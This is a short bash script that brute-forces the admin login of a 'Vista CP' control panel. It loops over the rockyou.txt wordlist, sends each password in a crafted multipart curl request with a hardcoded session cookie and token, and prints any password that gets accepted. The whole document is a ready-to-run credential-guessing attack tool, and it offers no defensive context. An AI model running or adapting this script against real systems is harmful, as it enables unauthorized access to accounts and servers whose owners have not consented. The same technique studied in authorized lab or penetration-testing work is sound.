#!/bin/bash 
#Made By Bearcules >>
#Use It At Your Own Risk >>
#Brute_Forcing_Script_For_Vista_CP >> 
#Variables >>
Url="https://192.168.xxx.xx:8083/api/v1/login/index.php"
headrz="Cookie: PHPSESSID=6n7irtlp7q85c8or6gt94g24b3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=---------------------------179674933721636399692121599986
Referer: https://192.168.xxx.xx:8083/login
"
wordlist="/usr/share/wordlists/rockyou.txt" 
#For Loop to go through all the Password in the Wordlist >> 
for pass in $(cat $wordlist) ;do 
data='-----------------------------179674933721636399692121599986
Content-Disposition: form-data; name="user"

admin
-----------------------------179674933721636399692121599986
Content-Disposition: form-data; name="password"

'$pass'
-----------------------------179674933721636399692121599986
Content-Disposition: form-data; name="token"

0e424e10216447b4d7abda555fcbb971
-----------------------------179674933721636399692121599986--'	
#try the Passwords 1 by 1 by Using Curl to send a crafted http Request >> 	 
resp=$(curl -k -i -s -H "$headrz" --data-binary "$data" "$Url" -x http://127.0.0.1:8080 ) 
clean_resp=$(echo "$resp" | awk -F '"error":' '{print $2}' | sed  -e '/./,$!d' -e :a -e '/^\n*$/{$d;N;ba' -e '}' | awk -F 'or' '{print $1}' | sed 's/"//g' ) 
if [[ "$clean_resp" == *"Invalid username"* ]] ; then 
#Keeps tracking of the Number of Password that it being Used by adding a number each time the Password is not Matched >> 
let count=count+1
echo "NOT FOUND " "$count" 
else 
#If the Password is Matched it will Print it >> 
echo "Found Password : " "$pass"
fi
done 
 
